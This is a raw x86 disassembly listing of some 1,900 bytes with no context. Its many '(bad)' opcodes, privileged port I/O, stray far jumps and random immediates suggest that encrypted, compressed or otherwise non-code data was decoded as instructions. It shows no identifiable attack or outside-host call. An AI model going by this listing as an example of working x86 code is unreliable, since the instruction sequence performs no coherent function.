  41dc87:	xor    eax,0x2ca4cbd
  41dc8c:	jno    0x41dc41
  41dc8e:	and    eax,DWORD PTR [edx+ebp*2]
  41dc91:	jmp    0xbde6:0x9ecbfc6b
  41dc98:	fild   WORD PTR [ecx+ebx*4+0x389a1206]
  41dc9f:	cmp    BYTE PTR [edi+0x79],bl
  41dca2:	mov    ch,0xfb
  41dca4:	(bad)  [eax]
  41dca6:	xor    DWORD PTR [edx+0x1b],esi
  41dca9:	ins    DWORD PTR es:[edi],dx
  41dcaa:	inc    ebp
  41dcab:	in     eax,dx
  41dcac:	mov    cl,0x55
  41dcae:	xlat   BYTE PTR ds:[ebx]
  41dcaf:	stos   DWORD PTR es:[edi],eax
  41dcb0:	mov    edi,0x9106b9c
  41dcb5:	ins    BYTE PTR es:[edi],dx
  41dcb6:	ins    BYTE PTR es:[edi],dx
  41dcb7:	call   0xfce:0x16f71ea7
  41dcbe:	dec    edi
  41dcbf:	pop    esi
  41dcc0:	jne    0x41dd3f
  41dcc2:	and    al,0x4e
  41dcc4:	and    al,0x47
  41dcc6:	ds clc 
  41dcc8:	add    al,0xc2
  41dcca:	mov    ebx,esi
  41dccc:	push   0xae3057c
  41dcd1:	inc    ecx
  41dcd2:	es jg  0x41dd54
  41dcd5:	bnd jne 0x41dd25
  41dcd8:	adc    eax,edx
  41dcda:	xchg   ebp,eax
  41dcdb:	stc    
  41dcdc:	hlt    
  41dcdd:	jp     0x41dd08
  41dcdf:	xor    BYTE PTR [esi],cl
  41dce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dce2:	push   eax
  41dce3:	into   
  41dce4:	adc    ecx,0xae21ac7b
  41dcea:	(bad)  
  41dceb:	sbb    ecx,DWORD PTR [ebp+0x352a2ee6]
  41dcf1:	and    ah,bh
  41dcf3:	mov    cl,0x98
  41dcf5:	jmp    0x2077:0x9ed6a2a6
  41dcfc:	push   cs
  41dcfd:	rcr    ah,0xfe
  41dd00:	mov    ebx,0x3451f6b7
  41dd05:	iret   
  41dd06:	jne    0x41dca8
  41dd08:	or     DWORD PTR [eax-0x49],edx
  41dd0b:	xor    eax,0x293da79f
  41dd10:	out    0xb9,al
  41dd12:	pop    esp
  41dd13:	(bad)  
  41dd15:	into   
  41dd16:	pop    es
  41dd17:	jo     0x41dd6c
  41dd19:	ja     0x41dd32
  41dd1b:	xor    BYTE PTR [edi-0x447c2f6e],ah
  41dd21:	push   0xe3c63516
  41dd26:	inc    esi
  41dd27:	adc    al,0x62
  41dd29:	inc    ebx
  41dd2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd2b:	sub    BYTE PTR fs:[edx+0x47],bl
  41dd2f:	lfs    ebp,FWORD PTR [ebx+0x7d0aac84]
  41dd36:	(bad)  
  41dd37:	out    0x29,al
  41dd39:	push   esi
  41dd3a:	nop
  41dd3b:	lods   eax,DWORD PTR ds:[esi]
  41dd3c:	mov    cl,0x9d
  41dd3e:	xlat   BYTE PTR ds:[ebx]
  41dd3f:	int    0x2c
  41dd41:	int    0xc3
  41dd43:	jl     0x41dcea
  41dd45:	cmp    al,0xb2
  41dd47:	ins    BYTE PTR es:[edi],dx
  41dd48:	jb     0x41dd63
  41dd4a:	push   edx
  41dd4b:	cmp    edx,esp
  41dd4d:	test   BYTE PTR [esi-0x60e88a46],bl
  41dd53:	cli    
  41dd54:	inc    ebp
  41dd55:	xor    BYTE PTR [esi-0x69c9153],ah
  41dd5b:	aam    0x69
  41dd5d:	xchg   ebx,eax
  41dd5e:	dec    edx
  41dd5f:	xor    BYTE PTR [ebp+0x5bb19b30],ch
  41dd65:	pop    ss
  41dd66:	xchg   ebp,eax
  41dd67:	mov    ah,0x88
  41dd69:	addr16 xchg ecx,eax
  41dd6b:	mov    eax,DWORD PTR [ebx+esi*2+0x66]
  41dd6f:	mov    al,ds:0x2a42a513
  41dd74:	mov    bh,0xdb
  41dd76:	mov    ebx,0x9132452c
  41dd7b:	sub    edi,ebp
  41dd7d:	lea    ebx,[edx-0x17]
  41dd80:	bound  eax,QWORD PTR [eax-0x77be992d]
  41dd86:	(bad)  
  41dd87:	sbb    al,0x96
  41dd89:	pop    esi
  41dd8a:	es lahf 
  41dd8c:	imul   edx,DWORD PTR [esp+eax*8-0x57],0x62
  41dd91:	jl     0x41dd5f
  41dd93:	loop   0x41dd9e
  41dd95:	jmp    0x3eb2:0x5ca10f70
  41dd9c:	pop    eax
  41dd9d:	test   DWORD PTR [ebx+0x13],esp
  41dda0:	(bad)  
  41dda1:	fstp   TBYTE PTR [ecx]
  41dda3:	les    ebp,FWORD PTR [eax-0x7ecd00cf]
  41dda9:	syscall 
  41ddab:	leave  
  41ddac:	pop    esp
  41ddad:	pop    edi
  41ddae:	jbe    0x41ddf6
  41ddb0:	and    eax,0x50d26fa7
  41ddb5:	lods   eax,DWORD PTR ds:[esi]
  41ddb6:	fs inc esi
  41ddb8:	pop    ss
  41ddb9:	xchg   sp,ax
  41ddbb:	mov    ebx,DWORD PTR [ecx-0x42]
  41ddbe:	sub    bh,bl
  41ddc0:	or     ah,dh
  41ddc2:	enter  0x775d,0xfd
  41ddc6:	in     eax,dx
  41ddc7:	adc    BYTE PTR [ebx-0x52],dl
  41ddca:	int    0xd7
  41ddcc:	scas   eax,DWORD PTR es:[edi]
  41ddcd:	sbb    BYTE PTR [ebx+ecx*4+0x1b],al
  41ddd1:	cmp    eax,0xbb387630
  41ddd6:	outs   dx,BYTE PTR ds:[esi]
  41ddd7:	xchg   BYTE PTR [ecx],dl
  41ddd9:	xchg   DWORD PTR ds:0xaf8fcc8f,ecx
  41dddf:	xchg   ecx,eax
  41dde0:	xchg   esp,eax
  41dde1:	ror    DWORD PTR [ebp-0x4be0287e],1
  41dde7:	(bad)  [esi+0x7112de87]
  41dded:	xor    edx,DWORD PTR [esi-0x91cdf90]
  41ddf3:	pop    DWORD PTR [ebx-0x6180995c]
  41ddf9:	mov    esi,0x7f006619
  41ddfe:	inc    ebx
  41ddff:	adc    BYTE PTR [eax-0x1f],0xdd
  41de03:	push   ds
  41de04:	imul   DWORD PTR [edi+eax*4+0x7c8eb054]
  41de0b:	jnp    0x41de16
  41de0d:	mov    ecx,0xcf5ac7a
  41de12:	add    DWORD PTR [edx-0x3b4a95ce],ebp
  41de18:	cli    
  41de19:	add    DWORD PTR [ebx-0x65],edx
  41de1c:	xchg   ebx,eax
  41de1d:	adc    al,BYTE PTR [ebp-0x1da11b5f]
  41de23:	mov    bh,0x6e
  41de25:	inc    esi
  41de26:	stos   DWORD PTR es:[edi],eax
  41de27:	les    esi,FWORD PTR [esi]
  41de29:	push   ecx
  41de2a:	push   ebp
  41de2b:	in     eax,0x6b
  41de2d:	and    BYTE PTR ds:0xecd6e6d0,dh
  41de33:	(bad)  [ecx]
  41de35:	retf   
  41de36:	dec    esi
  41de37:	pop    es
  41de38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de39:	add    DWORD PTR [ecx+0x15df42a8],0x86f53c10
  41de43:	push   edx
  41de44:	cwde   
  41de45:	mov    ds:0x2e26abbc,eax
  41de4a:	push   ecx
  41de4b:	jb     0x41dea0
  41de4d:	jmp    0x41de53
  41de4f:	mov    eax,ds:0xab6784e4
  41de54:	lods   al,BYTE PTR ds:[esi]
  41de55:	mov    edx,0xb600f03b
  41de5a:	sub    bp,di
  41de5d:	inc    edi
  41de5e:	imul   ecx,DWORD PTR [ecx-0x7b],0x8
  41de62:	adc    eax,0xd0670877
  41de67:	or     eax,0x10a229c7
  41de6c:	and    DWORD PTR [edi+0x66],ebp
  41de6f:	dec    esp
  41de70:	adc    eax,0x73759b3e
  41de75:	js     0x41deeb
  41de77:	lea    ebx,[esi+esi*4-0x3d]
  41de7b:	retf   0x5295
  41de7e:	std    
  41de7f:	sub    al,BYTE PTR [ebx-0x40]
  41de82:	or     BYTE PTR [esi],0x7e
  41de85:	sbb    BYTE PTR [ebp-0x7d],cl
  41de88:	daa    
  41de89:	mov    ah,0x3d
  41de8b:	test   BYTE PTR [ebx],0x7f
  41de8e:	dec    eax
  41de8f:	sub    ebp,DWORD PTR [edx+0x4e]
  41de92:	jno    0x41de44
  41de94:	frstor [ebp+eax*4+0x10]
  41de98:	xlat   BYTE PTR ds:[ebx]
  41de99:	rcr    DWORD PTR [ebp+0x4bd52fcc],1
  41de9f:	cmp    bh,BYTE PTR [ebp-0x470bb647]
  41dea5:	cmp    eax,0x931867b1
  41deaa:	adc    bh,cl
  41deac:	add    al,al
  41deae:	and    ebx,DWORD PTR [ecx-0xa]
  41deb1:	pop    esi
  41deb2:	(bad)  
  41deb3:	mov    al,ds:0x185e5148
  41deb8:	inc    esi
  41deb9:	inc    ebx
  41deba:	jmp    0x717:0xbd1c3207
  41dec1:	scas   al,BYTE PTR es:[edi]
  41dec2:	mov    ah,0xbc
  41dec4:	repnz xor al,0xea
  41dec7:	(bad)  
  41dec8:	cmp    al,0xef
  41deca:	xor    bh,BYTE PTR [ebx]
  41decc:	pop    ebp
  41decd:	(bad)  
  41dece:	not    DWORD PTR [ecx]
  41ded0:	les    eax,FWORD PTR ds:0xbba3a160
  41ded6:	cwde   
  41ded7:	nop
  41ded8:	sti    
  41ded9:	jmp    0x41deb5
  41dedb:	fiadd  DWORD PTR [eax]
  41dedd:	inc    edi
  41dede:	push   edx
  41dedf:	shr    DWORD PTR [edi],cl
  41dee1:	xchg   esp,eax
  41dee2:	pop    edi
  41dee3:	mov    ah,0x42
  41dee5:	nop
  41dee6:	jnp    0x41ded6
  41dee8:	xchg   esp,eax
  41dee9:	or     BYTE PTR [ebx+0x721a9d68],0x0
  41def0:	add    BYTE PTR [eax+0x1d],al
  41def3:	pop    ss
  41def4:	jae    0x41dedd
  41def6:	mov    ds,WORD PTR [ebx]
  41def8:	clc    
  41def9:	or     al,0xe4
  41defb:	lahf   
  41defc:	call   eax
  41defe:	jnp    0x41deb6
  41df00:	inc    ebx
  41df01:	daa    
  41df02:	mov    BYTE PTR [edx+0x45],dh
  41df05:	add    eax,0xa44bf044
  41df0a:	or     BYTE PTR ss:[eax],al
  41df0d:	jo     0x41deb3
  41df0f:	scas   eax,DWORD PTR es:[edi]
  41df10:	jle    0x41df48
  41df12:	hlt    
  41df13:	int    0x5
  41df15:	iret   
  41df16:	push   ss
  41df17:	jge    0x41decd
  41df19:	jp     0x41df79
  41df1b:	pop    esp
  41df1c:	xchg   BYTE PTR [eax+0x53],cl
  41df1f:	mov    dl,0x4b
  41df21:	mov    bl,0x59
  41df23:	fstp   QWORD PTR [ebp+0x3]
  41df26:	data16 jns 0x41deeb
  41df29:	ins    BYTE PTR es:[edi],dx
  41df2a:	adc    DWORD PTR [eax+0x6af2a45],0xffffffc6
  41df31:	mov    bl,0x2f
  41df33:	repz sti 
  41df35:	push   ebx
  41df36:	mov    dl,0x4
  41df38:	bound  ecx,QWORD PTR [ebp+esi*2-0x66]
  41df3c:	xor    al,cl
  41df3e:	xchg   ebp,eax
  41df3f:	out    0x9f,eax
  41df41:	sbb    BYTE PTR [ecx],0xd5
  41df44:	jmp    0x45f3c444
  41df49:	adc    cl,BYTE PTR [eax+0x28772fb2]
  41df4f:	pushf  
  41df50:	adc    DWORD PTR [edi],0x65762f8c
  41df56:	test   BYTE PTR [ecx+0x74e4fede],dh
  41df5c:	xchg   bh,bl
  41df5e:	jbe    0x41df5b
  41df60:	aad    0xe9
  41df62:	push   esp
  41df63:	lea    ebx,[ebx+0x1f]
  41df66:	sub    DWORD PTR [edi],edi
  41df68:	xor    DWORD PTR [esi+0x50],0xffffffc5
  41df6c:	pop    ds
  41df6d:	daa    
  41df6e:	sub    DWORD PTR [ebx+0x75],ebp
  41df71:	loop   0x41df87
  41df73:	mov    ecx,0x3cab9201
  41df78:	out    0x8d,al
  41df7a:	xor    al,0xc7
  41df7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7d:	lock adc al,BYTE PTR ss:[ecx]
  41df81:	repz mov ebp,0x458f8ae9
  41df87:	jns    0x41df16
  41df89:	sbb    al,0xcb
  41df8b:	and    esp,DWORD PTR [eax+0x12]
  41df8e:	sub    al,0xda
  41df90:	jmp    0x750f6409
  41df95:	sub    DWORD PTR [esi+ecx*1-0x6ea3fdf4],esp
  41df9c:	xchg   esp,eax
  41df9d:	icebp  
  41df9e:	xchg   edi,eax
  41df9f:	jo     0x41dfcb
  41dfa1:	inc    esp
  41dfa2:	and    eax,0x957efe78
  41dfa7:	jmp    0x88fc9585
  41dfac:	inc    edi
  41dfad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfae:	jecxz  0x41df61
  41dfb0:	mov    cs,ecx
  41dfb2:	cli    
  41dfb3:	shl    DWORD PTR [eax-0x2],1
  41dfb6:	dec    esp
  41dfb7:	or     BYTE PTR [ebx+0x753878c3],cl
  41dfbd:	jmp    0x41dfad
  41dfbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfc0:	mov    eax,0xe41e5db7
  41dfc5:	cmp    ecx,DWORD PTR [esi+0xf]
  41dfc8:	in     eax,dx
  41dfc9:	mov    esi,ecx
  41dfcb:	mov    ecx,DWORD PTR [edx-0x5c]
  41dfce:	pop    eax
  41dfcf:	stos   BYTE PTR es:[edi],al
  41dfd0:	lods   eax,DWORD PTR ds:[esi]
  41dfd1:	add    cl,BYTE PTR [esi+esi*4]
  41dfd4:	stos   BYTE PTR es:[edi],al
  41dfd5:	and    DWORD PTR [edx+edi*2],esp
  41dfd8:	scas   eax,DWORD PTR es:[edi]
  41dfd9:	ja     0x41e03a
  41dfdb:	dec    esp
  41dfdc:	int3   
  41dfdd:	sbb    ebp,DWORD PTR [eax-0x6733a02]
  41dfe3:	add    eax,0x99a45527
  41dfe8:	clc    
  41dfe9:	dec    edi
  41dfea:	rcl    BYTE PTR [ebx],cl
  41dfec:	stos   DWORD PTR es:[edi],eax
  41dfed:	add    eax,0xb52f6077
  41dff2:	(bad)  
  41dff3:	sar    BYTE PTR [ecx],cl
  41dff5:	sub    esi,edi
  41dff7:	adc    ebp,ebp
  41dff9:	sbb    esp,edi
  41dffb:	xchg   ebx,edx
  41dffd:	daa    
  41dffe:	outs   dx,DWORD PTR ds:[esi]
  41dfff:	popa   
  41e000:	mov    edi,0x66e5909f
  41e005:	dec    ebx
  41e006:	fdivrp st(6),st
  41e008:	xchg   DWORD PTR [edx],esp
  41e00a:	xchg   edx,eax
  41e00b:	jmp    0xf94b:0xd6fb4c41
  41e012:	pop    esp
  41e013:	push   eax
  41e014:	push   cs
  41e015:	adc    eax,edx
  41e017:	imul   ebp,DWORD PTR [eax-0x1c],0xa95c3583
  41e01e:	int    0x5d
  41e020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e021:	loopne 0x41e044
  41e023:	lds    esp,FWORD PTR [edi-0x39c720e1]
  41e029:	(bad)  
  41e02a:	icebp  
  41e02b:	out    0xdc,eax
  41e02d:	push   eax
  41e02e:	sbb    esp,ebx
  41e030:	imul   BYTE PTR [ebp+0x3acb8e]
  41e036:	lahf   
  41e037:	imul   DWORD PTR [ebp-0x4aed04cb]
  41e03d:	leave  
  41e03e:	dec    esp
  41e03f:	push   0xffffff83
  41e041:	sub    DWORD PTR [esi+0x4a],ecx
  41e044:	mov    ebp,0xc58e7e0f
  41e049:	dec    edx
  41e04a:	inc    esi
  41e04b:	or     eax,0x6f945908
  41e050:	and    ch,BYTE PTR [eax+0x1]
  41e053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e054:	shl    BYTE PTR [edx+0x37af527f],1
  41e05a:	dec    BYTE PTR [eax-0x8802be4]
  41e060:	sub    DWORD PTR [esi],0x4a200e1b
  41e066:	mov    ah,0xc6
  41e068:	das    
  41e069:	out    dx,al
  41e06a:	aam    0x3b
  41e06c:	lds    esi,FWORD PTR [ecx-0x30]
  41e06f:	or     al,0xc7
  41e071:	ret    
  41e072:	(bad)  
  41e073:	jnp    0x41e04d
  41e075:	jmp    DWORD PTR [edx-0x6a742410]
  41e07b:	arpl   bx,sp
  41e07d:	gs jl  0x41e071
  41e080:	sbb    dl,BYTE PTR [ecx-0xffa596c]
  41e086:	test   al,cl
  41e088:	outs   dx,DWORD PTR ds:[esi]
  41e089:	push   eax
  41e08a:	outs   dx,DWORD PTR ds:[esi]
  41e08b:	cmp    eax,edi
  41e08d:	jae    0x41e0db
  41e08f:	add    eax,DWORD PTR [esi+0x21]
  41e092:	cwde   
  41e093:	push   ss
  41e094:	pop    eax
  41e095:	sub    DWORD PTR [esi-0x5aaf5a39],esi
  41e09b:	pushf  
  41e09c:	cmp    ch,BYTE PTR [edi-0x77dd150d]
  41e0a2:	xchg   ebp,eax
  41e0a3:	jl     0x41e119
  41e0a5:	sahf   
  41e0a6:	or     eax,0xf0319229
  41e0ab:	pop    esi
  41e0ac:	jne    0x41e0e5
  41e0ae:	dec    edx
  41e0af:	push   eax
  41e0b0:	push   eax
  41e0b1:	mov    cl,0x3b
  41e0b3:	shr    DWORD PTR [ebp-0x7c867377],0xd2
  41e0ba:	and    eax,0xb24d80
  41e0bf:	cs scas al,BYTE PTR es:[edi]
  41e0c1:	(bad)  
  41e0c2:	mov    dh,BYTE PTR [eax-0x3206d7f7]
  41e0c8:	sbb    eax,0xc6649aaa
  41e0cd:	(bad)  
  41e0ce:	stos   BYTE PTR es:[edi],al
  41e0cf:	pop    ss
  41e0d0:	out    0xac,al
  41e0d2:	push   ecx
  41e0d3:	leave  
  41e0d4:	xchg   ebp,eax
  41e0d5:	das    
  41e0d6:	repnz and eax,0x737df21b
  41e0dc:	push   es
  41e0dd:	aaa    
  41e0de:	push   edx
  41e0df:	popa   
  41e0e0:	leave  
  41e0e1:	lods   al,BYTE PTR ds:[esi]
  41e0e2:	sub    BYTE PTR [edx+0x26be546],dh
  41e0e8:	cmp    bh,BYTE PTR [ecx]
  41e0ea:	into   
  41e0eb:	cmp    eax,0xbeb88308
  41e0f0:	cmp    BYTE PTR [edi],0x65
  41e0f3:	cdq    
  41e0f4:	add    BYTE PTR [edi-0x26a7e88d],dh
  41e0fa:	popf   
  41e0fb:	stc    
  41e0fc:	icebp  
  41e0fd:	lock mov esi,0xa11ce736
  41e103:	or     eax,0x7889772f
  41e108:	sar    dh,cl
  41e10a:	jno    0x41e09f
  41e10c:	xlat   BYTE PTR ds:[ebx]
  41e10d:	or     esi,DWORD PTR [edi+ebp*2-0x71]
  41e111:	and    BYTE PTR [eax],ah
  41e113:	jb     0x41e0ed
  41e115:	retf   
  41e116:	lock repz push edx
  41e119:	shr    BYTE PTR [ecx-0x7],0xad
  41e11d:	fs stc 
  41e11f:	push   ebp
  41e120:	(bad)  
  41e121:	cmp    esp,esp
  41e123:	xor    al,0xb1
  41e125:	std    
  41e126:	pop    ebp
  41e127:	and    DWORD PTR [eax+0x68c6e445],edi
  41e12d:	pushf  
  41e12e:	add    BYTE PTR [ebx+0x66ac1f6d],bh
  41e134:	arpl   WORD PTR [eax+0x448e9774],ax
  41e13a:	jp     0x41e13b
  41e13c:	js     0x41e1aa
  41e13e:	push   ebp
  41e13f:	xor    eax,0x20d21cd7
  41e144:	es ins BYTE PTR es:[edi],dx
  41e146:	shr    esp,cl
  41e148:	mov    ds:0x6dd9534d,eax
  41e14d:	mov    ch,0x8
  41e14f:	not    edi
  41e151:	inc    ebp
  41e152:	inc    esp
  41e153:	jbe    0x41e1c9
  41e155:	cmp    BYTE PTR [esi+0x6ff1cda5],0x45
  41e15c:	mov    dl,0x92
  41e15e:	(bad)  
  41e15f:	xchg   esp,eax
  41e160:	push   0x98dca2b7
  41e165:	cs repnz mov bl,0xc2
  41e169:	ret    
  41e16a:	and    al,0x34
  41e16c:	aaa    
  41e16d:	int    0xc2
  41e16f:	arpl   WORD PTR [edi],si
  41e171:	or     cl,BYTE PTR [eax+0x6fee5085]
  41e177:	inc    esi
  41e178:	arpl   si,ax
  41e17a:	mov    al,BYTE PTR [eax]
  41e17c:	lea    esp,[eax]
  41e17e:	call   0xed:0xe9ccceb6
  41e185:	cmp    BYTE PTR [esi],dl
  41e187:	punpcklwd mm1,DWORD PTR [eax]
  41e18a:	enter  0x2bb3,0x97
  41e18e:	adc    dl,cl
  41e190:	rcl    DWORD PTR [esi+0x77567f3a],0x3a
  41e197:	lock fstp DWORD PTR [ebp-0x4d]
  41e19b:	push   ebx
  41e19c:	fcomip st,st(6)
  41e19e:	psubsb mm5,QWORD PTR [esi-0x59b9486]
  41e1a5:	cmp    BYTE PTR [edx-0x67],0xa4
  41e1a9:	pop    eax
  41e1aa:	mov    ch,BYTE PTR [eax]
  41e1ac:	cdq    
  41e1ad:	sub    ah,BYTE PTR [edi]
  41e1af:	and    esp,DWORD PTR [eax+0x3]
  41e1b2:	loope  0x41e16b
  41e1b4:	fdivr  DWORD PTR [ebx]
  41e1b6:	mov    edx,0x9b86ab67
  41e1bb:	(bad)  
  41e1bd:	jb     0x41e188
  41e1bf:	dec    ebp
  41e1c0:	ja     0x41e1a1
  41e1c2:	dec    ebx
  41e1c3:	inc    ecx
  41e1c4:	and    eax,esp
  41e1c6:	mov    eax,0xf1d24ca8
  41e1cb:	xor    al,0x2
  41e1cd:	fwait
  41e1ce:	cmp    esp,DWORD PTR [edi+0x3792caf0]
  41e1d4:	mov    bl,0xc2
  41e1d7:	inc    edx
  41e1d8:	sub    al,0x14
  41e1da:	sbb    ch,BYTE PTR ss:[edx]
  41e1dd:	xchg   esp,eax
  41e1de:	xchg   ebp,eax
  41e1df:	sub    ch,dl
  41e1e1:	jecxz  0x41e183
  41e1e3:	add    al,BYTE PTR [ebp*1-0x260c38b]
  41e1ea:	mov    ecx,0xb14bcdec
  41e1ef:	enter  0x1fcb,0x47
  41e1f3:	push   es
  41e1f4:	sbb    al,BYTE PTR [edi-0x435d8bac]
  41e1fa:	iret   
  41e1fb:	aad    0xb3
  41e1fd:	adc    ah,dh
  41e1ff:	inc    ecx
  41e200:	sub    al,bh
  41e202:	jmp    0xe4b5:0xc7caa5d4
  41e209:	sbb    eax,esi
  41e20b:	and    eax,edx
  41e20d:	aad    0x53
  41e20f:	add    BYTE PTR [eax+edx*8],bl
  41e212:	push   ss
  41e213:	jb     0x41e1d3
  41e215:	or     al,0x2d
  41e217:	stos   DWORD PTR es:[edi],eax
  41e218:	retf   0xa88b
  41e21b:	or     ebp,DWORD PTR [esi]
  41e21d:	outs   dx,BYTE PTR ds:[esi]
  41e21e:	adc    eax,0xb80265a2
  41e223:	cld    
  41e224:	fimul  WORD PTR ss:[eax-0x5d48952b]
  41e22b:	pop    ebx
  41e22c:	clc    
  41e22d:	xchg   ecx,eax
  41e22e:	cmc    
  41e22f:	jle    0x41e1d1
  41e231:	xchg   ecx,eax
  41e232:	pop    ebx
  41e233:	out    0x26,eax
  41e235:	inc    ebx
  41e236:	mov    edi,0x22cff50e
  41e23b:	ins    BYTE PTR es:[edi],dx
  41e23c:	sub    al,0x9a
  41e23e:	es pop edi
  41e240:	call   0x15b12b59
  41e245:	pop    esi
  41e246:	nop
  41e247:	ror    DWORD PTR [edi],0x61
  41e24a:	fsubr  DWORD PTR [edx+0x28]
  41e24d:	cmc    
  41e24e:	das    
  41e24f:	arpl   WORD PTR [ebx],ax
  41e251:	jge    0x41e293
  41e253:	mov    bl,0xaa
  41e256:	out    dx,eax
  41e257:	adc    ebp,0x325a8566
  41e25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e25e:	add    BYTE PTR [esi],0x53
  41e261:	mov    ebp,0x2f0f75b8
  41e266:	test   BYTE PTR [eiz*8-0x7c8f59a8],cl
  41e26d:	xor    al,0x17
  41e26f:	xor    dl,BYTE PTR [esi]
  41e271:	out    0xb6,al
  41e273:	bound  eax,QWORD PTR [ecx]
  41e275:	call   0x51a2:0x8c1a82db
  41e27c:	jno    0x41e2bd
  41e27e:	sbb    eax,DWORD PTR [eax+ebp*8+0x16]
  41e282:	push   edx
  41e283:	in     eax,dx
  41e284:	std    
  41e285:	add    esi,DWORD PTR [ecx+0x3a]
  41e288:	jp     0x41e23a
  41e28a:	daa    
  41e28b:	jae    0x41e25a
  41e28d:	sbb    bl,al
  41e28f:	pop    ebx
  41e290:	xchg   ebx,eax
  41e291:	es in  al,0x40
  41e294:	adc    ch,0x50
  41e297:	test   DWORD PTR [eax+0x5bf0cd93],0xd441d830
  41e2a1:	push   edi
  41e2a2:	xchg   edx,eax
  41e2a3:	xor    eax,0xafd229fb
  41e2a8:	inc    eax
  41e2a9:	call   0x761d:0x14993fe3
  41e2b0:	cmp    BYTE PTR [edx-0x30e5c225],dh
  41e2b6:	frstor [edi+0x34f8b6c5]
  41e2bc:	ds fwait
  41e2be:	and    eax,0x8c4f7779
  41e2c3:	jecxz  0x41e2c0
  41e2c5:	sbb    al,0xdb
  41e2c7:	out    0xb6,al
  41e2c9:	sbb    al,0xec
  41e2cb:	and    ebx,DWORD PTR [edx]
  41e2cd:	pop    eax
  41e2ce:	dec    eax
  41e2cf:	cwde   
  41e2d0:	fdivr  DWORD PTR [esp+esi*8]
  41e2d3:	addr16 cmp eax,0xfe1f13f5
  41e2d9:	xchg   esi,edi
  41e2db:	sub    ch,BYTE PTR [eax-0x4]
  41e2de:	test   BYTE PTR [esi],al
  41e2e0:	pop    ecx
  41e2e1:	and    eax,0xffffffd4
  41e2e4:	mov    DWORD PTR [esi],ebp
  41e2e6:	pop    es
  41e2e7:	inc    DWORD PTR [ebx+0x36]
  41e2ea:	push   cs
  41e2eb:	jno    0x41e271
  41e2ed:	add    eax,0xaaf9beba
  41e2f2:	dec    ebp
  41e2f3:	ret    
  41e2f4:	xor    bh,ah
  41e2f6:	xchg   ebx,eax
  41e2f7:	xchg   edx,edx
  41e2f9:	scas   al,BYTE PTR es:[edi]
  41e2fa:	mov    bh,0xe6
  41e2fc:	pop    ss
  41e2fd:	mov    bh,0x1f
  41e2ff:	imul   esi,DWORD PTR [edi-0xd92a90f],0x92299ef7
  41e309:	loop   0x41e2d1
  41e30b:	pop    ebx
  41e30c:	or     eax,0xed75d8b6
  41e311:	mov    esp,0x21ffdbd8
  41e316:	aam    0xfd
  41e318:	ins    BYTE PTR es:[edi],dx
  41e319:	mov    WORD PTR [ecx],es
  41e31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e31c:	dec    eax
  41e31d:	retf   
  41e31e:	xor    esi,esi
  41e320:	cmp    al,0x6a
  41e322:	sub    eax,0x3d25d787
  41e327:	fdiv   DWORD PTR [edi+0x16f380c2]
  41e32d:	(bad)  
  41e32e:	sbb    eax,0x29fe018
  41e333:	xchg   BYTE PTR [edi-0x2cb2b7c6],cl
  41e339:	push   cs
  41e33a:	mov    esp,0x6e62381b
  41e33f:	push   edx
  41e340:	(bad)  
  41e341:	dec    ebp
  41e342:	jg     0x41e36c
  41e344:	dec    edi
  41e345:	popf   
  41e346:	pop    ss
  41e347:	and    al,BYTE PTR [esp+eiz*2-0x2d]
  41e34b:	je     0x41e354
  41e34d:	mov    eax,0x5f3dfb4e
  41e352:	sbb    esp,esi
  41e354:	dec    ecx
  41e355:	mov    ds:0xb70f85a8,al
  41e35a:	mov    edx,0xdb8f7ecf
  41e35f:	mov    ecx,0xb39b0556
  41e364:	push   es
  41e365:	dec    esp
  41e366:	nop
  41e367:	pop    edi
  41e368:	sbb    eax,0xd28cc8d0
  41e36d:	jb     0x41e373
  41e36f:	push   ebx
  41e370:	and    al,0x8c
  41e372:	imul   ecx,DWORD PTR [esi-0x716b7fd4],0xffffff92
  41e379:	mov    BYTE PTR [edi-0xd62f932],cl
  41e37f:	or     cl,BYTE PTR [edi-0x74]
  41e382:	jle    0x41e3c0
  41e384:	mov    ebp,0x3b563c9c
  41e389:	mov    ebp,0xfd80adc3
  41e38e:	add    BYTE PTR gs:[ebp+eiz*2-0x4f],al
  41e393:	cwde   
  41e394:	lock dec ebx
  41e396:	test   DWORD PTR [ebx+edi*1+0x4c],ebx
  41e39a:	add    eax,0x7bfb4c1c
  41e39f:	clc    
  41e3a0:	les    eax,FWORD PTR [eax]
  41e3a2:	leave  
  41e3a3:	mov    al,ds:0xe61af8e
  41e3a8:	repnz mov DWORD PTR ss:[ebx-0x18],esp
  41e3ad:	push   ebp
  41e3ae:	loopne 0x41e376
  41e3b0:	xor    al,0xf4
  41e3b2:	shl    DWORD PTR [ebx+ebp*4+0x72dc2cbf],0xd5
  41e3ba:	iret   
  41e3bb:	cld    
  41e3bc:	and    ah,bl
  41e3be:	dec    esi
  41e3bf:	mov    ah,0x46
  41e3c1:	xchg   BYTE PTR [esi+0x3c5cf783],dh
  41e3c7:	ds cmc 
  41e3c9:	addr16 out dx,al
  41e3cb:	ret    
  41e3cc:	test   BYTE PTR [eax],cl
  41e3ce:	push   ecx
  41e3cf:	inc    esi
  41e3d0:	xor    BYTE PTR [eax+0x58],0xb
  41e3d4:	je     0x41e3cc
  41e3d6:	repz add edx,DWORD PTR [ebx]
  41e3d9:	pop    eax
  41e3da:	shr    BYTE PTR [ecx+0x19c61551],1
  41e3e0:	inc    ebp
  41e3e1:	dec    ecx
  41e3e2:	pop    ds
  41e3e3:	xchg   DWORD PTR [edx-0x489d8f12],esp
  41e3e9:	jmp    0x41e36b
  41e3eb:	loop   0x41e3a3
  41e3ed:	mov    al,ds:0xbffa1b6a
  41e3f2:	mov    ah,0x26
  41e3f4:	dec    edx
  41e3f5:	in     al,dx
  41e3f6:	enter  0x6404,0x54
  41e3fa:	adc    ebx,eax
  41e3fc:	mov    ds:0xf242aeca,eax
  41e401:	mov    edi,esp
  41e403:	mov    eax,0x9c7c1f46
  41e408:	packuswb mm7,QWORD PTR [esi]
  41e40b:	sbb    al,0xff
